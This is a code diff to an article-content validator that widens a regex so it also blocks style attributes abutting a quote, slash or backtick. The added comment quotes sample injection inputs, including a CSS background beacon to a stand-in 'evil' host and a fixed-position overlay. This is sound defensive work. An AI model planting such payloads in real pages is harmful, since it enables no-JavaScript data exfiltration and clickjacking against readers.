@@ -297,8 +297,18 @@ const nonSpaceDelimitedInteractionSurfaceAttrPattern =
 // non-space-delimited alternation so any `[/"\'`]` boundary before the
 // attribute name is caught (still runs over emptyQuotedAttributeValues() so
 // benign URLs / class values pass).
+//
+// style= is included too — the existing `\sstyle\s*=` scan at line 169 only
+// catches the whitespace-delimited form, leaving the quote-/slash-/backtick-
+// abutted forms (e.g. `<img src="x"style="background:url(//evil/?leak)">`,
+// `<img src=x/style="position:fixed">`, `<img src=\`x\`style="color:red">`)
+// as a real no-JS data-exfiltration / clickjacking gap. style is the worst
+// allowed element to miss because it carries every CSS primitive that the
+// merged style comment already lists (CSS background beacons, fixed-position
+// overlays, content spoofing) — same presentational-injection family as the
+// rest of this alternation, so it lives in the same scan and error message.
 const nonSpaceDelimitedPresentationalLayoutAttrPattern =
-  /<[^>]*[/"'`](?:align|valign|bgcolor|background|border|cellpadding|cellspacing|hspace|vspace)\s*=/i;
+  /<[^>]*[/"'`](?:style|align|valign|bgcolor|background|border|cellpadding|cellspacing|hspace|vspace)\s*=/i;
 
 // width=/height= on an allowed <img> reserve an oversized layout box without the
 // blocked inline style= attribute — a layout-defacement surface (the same class
@@ -737,7 +747,7 @@ export function validateArticleContent(slug, content) {
 
   if (nonSpaceDelimitedPresentationalLayoutAttrPattern.test(emptiedAttributeContent)) {
     throw new Error(
-      `Unsafe article content in "${slug}": align, valign, bgcolor, background, border, cellpadding, cellspacing, hspace, and vspace attributes are not allowed in article content`,
+      `Unsafe article content in "${slug}": style, align, valign, bgcolor, background, border, cellpadding, cellspacing, hspace, and vspace attributes are not allowed in article content`,
     );
   }
 
